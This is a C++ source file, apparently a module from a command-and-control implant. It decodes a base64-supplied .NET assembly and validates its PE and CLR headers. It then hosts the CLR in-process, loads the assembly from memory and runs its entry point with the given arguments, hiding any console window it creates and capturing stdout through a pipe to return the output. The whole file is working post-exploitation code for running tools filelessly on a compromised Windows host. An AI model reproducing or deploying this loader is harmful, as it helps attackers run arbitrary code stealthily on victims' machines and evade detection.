#include "InlineAssembly.h"
#include "Helpers.h"
#include <metahost.h>
#include <vector>
#include <sstream>

#pragma comment(lib, "mscoree.lib")

// Import mscorlib type library — MSVC generates mscorlib.tlh/.tli on first build.
// Requires .NET Framework 4.x to be installed on the build machine.
// auto_rename: renames identifiers that clash with C++ reserved words (e.g. 'or' -> 'or__')
//              which prevents the || parse errors in the generated TLH.
#import <mscorlib.tlb> raw_interfaces_only auto_rename \
    rename("ReportEvent", "MSCOREE_ReportEvent") \
    rename("value",       "MSCOREE_value")        \
    rename("Currency",    "MSCOREE_Currency")

#define PIPE_BUFFER_LENGTH 0x10000

std::string InlineAssembly(std::vector<std::string> arguments, const std::string& file_data) {
    if (file_data.empty())
        return "Error: no assembly data";

    std::string assembly_bytes = base64_decode(file_data);
    if (assembly_bytes.empty())
        return "Error: failed to decode assembly";

    // Build wide argument string for CommandLineToArgvW
    std::wstring wargs;
    for (size_t i = 0; i < arguments.size(); i++) {
        if (i > 0) wargs += L' ';
        wargs += std::wstring(arguments[i].begin(), arguments[i].end());
    }

    HRESULT                      HResult         = S_OK;
    ICLRMetaHost*                IMetaHost       = nullptr;
    ICLRRuntimeInfo*             IRuntimeInfo    = nullptr;
    ICorRuntimeHost*             IRuntimeHost    = nullptr;
    IUnknown*                    IAppDomainThunk = nullptr;
    mscorlib::_AppDomain*        AppDomain       = nullptr;
    mscorlib::_Assembly*         Assembly        = nullptr;
    mscorlib::_MethodInfo*       MethodInfo      = nullptr;
    SAFEARRAYBOUND               SafeArrayBound  = {};
    SAFEARRAY*                   SafeAssembly    = nullptr;
    SAFEARRAY*                   SafeExpected    = nullptr;
    SAFEARRAY*                   SafeArguments   = nullptr;
    PWSTR*                       AssemblyArgv    = nullptr;
    ULONG                        AssemblyArgc    = 0;
    LONG                         Index           = 0;
    VARIANT                      VariantArgv     = {};
    BOOL                         IsLoadable      = FALSE;
    HWND                         ConExist        = nullptr;
    HWND                         ConHandle       = nullptr;
    HANDLE                       BackupHandle    = nullptr;
    HANDLE                       IoPipeRead      = nullptr;
    HANDLE                       IoPipeWrite     = nullptr;
    std::string                  output;

    // ── CLR bootstrap ────────────────────────────────────────────────────────
    if (FAILED(HResult = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
            reinterpret_cast<PVOID*>(&IMetaHost))))
        goto _CLEANUP;

    if (FAILED(HResult = IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo,
            reinterpret_cast<PVOID*>(&IRuntimeInfo))))
        goto _CLEANUP;

    if (FAILED(HResult = IRuntimeInfo->IsLoadable(&IsLoadable)) || !IsLoadable) {
        if (SUCCEEDED(HResult)) HResult = E_FAIL;
        goto _CLEANUP;
    }

    if (FAILED(HResult = IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost,
            reinterpret_cast<PVOID*>(&IRuntimeHost))))
        goto _CLEANUP;

    if (FAILED(HResult = IRuntimeHost->Start()))
        goto _CLEANUP;

    // ── AppDomain ────────────────────────────────────────────────────────────
    if (FAILED(HResult = IRuntimeHost->CreateDomain(L"InlineAssembly", nullptr, &IAppDomainThunk)))
        goto _CLEANUP;

    if (FAILED(HResult = IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain))))
        goto _CLEANUP;

    // ── Validate PE / managed-assembly header before calling into the CLR ────
    //   Avoids the opaque 0x8007000B (ERROR_BAD_FORMAT) from Load_3 when the
    //   file is a native DLL/EXE or simply the wrong file.
    {
        const auto* bytes = reinterpret_cast<const BYTE*>(assembly_bytes.data());
        const SIZE_T size  = assembly_bytes.size();

        // MZ header
        if (size < 64 || bytes[0] != 'M' || bytes[1] != 'Z') {
            output = "Error: not a PE file (missing MZ header) — select a managed .NET assembly";
            goto _CLEANUP;
        }

        // PE signature offset is at MZ+0x3C
        DWORD peOffset = *reinterpret_cast<const DWORD*>(bytes + 0x3C);
        if (size < static_cast<SIZE_T>(peOffset) + 24) {
            output = "Error: PE header truncated — file may be corrupted";
            goto _CLEANUP;
        }
        if (bytes[peOffset] != 'P' || bytes[peOffset+1] != 'E' ||
            bytes[peOffset+2] != 0  || bytes[peOffset+3] != 0) {
            output = "Error: invalid PE signature — select a managed .NET assembly";
            goto _CLEANUP;
        }

        // CLR COM descriptor directory (entry 14) must be non-zero.
        // Its RVA is at optional-header start + 0x70 (PE32) or + 0x80 (PE32+).
        WORD machine = *reinterpret_cast<const WORD*>(bytes + peOffset + 4);
        WORD optSize = *reinterpret_cast<const WORD*>(bytes + peOffset + 20);
        if (optSize < 0x70) {
            output = "Error: no optional header — select a managed .NET assembly";
            goto _CLEANUP;
        }
        DWORD optOffset = peOffset + 24;
        WORD  magic     = *reinterpret_cast<const WORD*>(bytes + optOffset);
        DWORD clrDirOffset = optOffset + (magic == 0x20B ? 0x80 : 0x70); // PE32+ vs PE32
        if (size < static_cast<SIZE_T>(clrDirOffset) + 8) {
            output = "Error: optional header too short — select a managed .NET assembly";
            goto _CLEANUP;
        }
        DWORD clrRva = *reinterpret_cast<const DWORD*>(bytes + clrDirOffset);
        if (clrRva == 0) {
            output = "Error: not a managed assembly (no CLR header) — select a .NET EXE or DLL";
            goto _CLEANUP;
        }
    }

    // ── Load assembly bytes via SAFEARRAY ────────────────────────────────────
    {
        PVOID pvData = nullptr;
        SafeArrayBound = { static_cast<ULONG>(assembly_bytes.size()), 0 };
        SafeAssembly   = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);
        if (!SafeAssembly) { HResult = E_OUTOFMEMORY; goto _CLEANUP; }
        // Use SafeArrayAccessData for correct locked access
        if (FAILED(HResult = SafeArrayAccessData(SafeAssembly, &pvData)))
            goto _CLEANUP;
        memcpy(pvData, assembly_bytes.data(), assembly_bytes.size());
        SafeArrayUnaccessData(SafeAssembly);
    }

    if (FAILED(HResult = AppDomain->Load_3(SafeAssembly, &Assembly)))
        goto _CLEANUP;

    // ── Entry point ──────────────────────────────────────────────────────────
    if (FAILED(HResult = Assembly->get_EntryPoint(&MethodInfo)))
        goto _CLEANUP;

    if (FAILED(HResult = MethodInfo->GetParameters(&SafeExpected)))
        goto _CLEANUP;

    // ── Build argument SAFEARRAY (only if entry point expects parameters) ────
    if (SafeExpected && SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
        SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);

        if (!wargs.empty())
            AssemblyArgv = CommandLineToArgvW(wargs.c_str(), reinterpret_cast<PINT>(&AssemblyArgc));

        VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
        VariantArgv.vt     = VT_ARRAY | VT_BSTR;

        for (Index = 0; Index < static_cast<LONG>(AssemblyArgc); Index++)
            SafeArrayPutElement(VariantArgv.parray, &Index, SysAllocString(AssemblyArgv[Index]));

        Index = 0;
        SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
        SafeArrayDestroy(VariantArgv.parray);
    }

    // ── Pipe + stdout redirect ───────────────────────────────────────────────
    if (!CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, PIPE_BUFFER_LENGTH)) {
        HResult = HRESULT_FROM_WIN32(GetLastError());
        goto _CLEANUP;
    }

    if (!(ConExist = GetConsoleWindow())) {
        AllocConsole();
        ConHandle = GetConsoleWindow();
        if (ConHandle) ShowWindow(ConHandle, SW_HIDE);
    }

    BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);

    // ── Invoke entry point ───────────────────────────────────────────────────
    MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr);

    // Restore stdout before reading so console I/O isn't disrupted
    SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
    BackupHandle = nullptr;

    // ── Drain pipe (non-blocking) ────────────────────────────────────────────
    {
        DWORD bytesAvailable = 0;
        while (PeekNamedPipe(IoPipeRead, nullptr, 0, nullptr, &bytesAvailable, nullptr)
               && bytesAvailable > 0) {
            std::vector<char> buf(bytesAvailable);
            DWORD bytesRead = 0;
            if (ReadFile(IoPipeRead, buf.data(), bytesAvailable, &bytesRead, nullptr) && bytesRead > 0)
                output.append(buf.data(), bytesRead);
        }
    }

_CLEANUP:
    if (BackupHandle)             SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
    if (AssemblyArgv)             LocalFree(AssemblyArgv);
    if (SafeAssembly)             SafeArrayDestroy(SafeAssembly);
    if (SafeArguments)            SafeArrayDestroy(SafeArguments);
    if (MethodInfo)               MethodInfo->Release();
    if (AppDomain)                AppDomain->Release();
    if (IAppDomainThunk)          IAppDomainThunk->Release();
    if (IRuntimeHost)             IRuntimeHost->Release();
    if (IRuntimeInfo)             IRuntimeInfo->Release();
    if (IMetaHost)                IMetaHost->Release();
    if (IoPipeWrite)              CloseHandle(IoPipeWrite);
    if (IoPipeRead)               CloseHandle(IoPipeRead);
    if (ConHandle && !ConExist)   FreeConsole();

    // Validation errors are written to output directly (HResult stays S_OK).
    if (!output.empty() && SUCCEEDED(HResult))
        return output;

    if (FAILED(HResult)) {
        if (!output.empty())
            return output; // validation message already set
        char hrbuf[16];
        sprintf_s(hrbuf, "0x%08lX", HResult);
        return std::string("Error: CLR execution failed (HRESULT ") + hrbuf + ")";
    }

    return output.empty() ? "(no output)" : output;
}
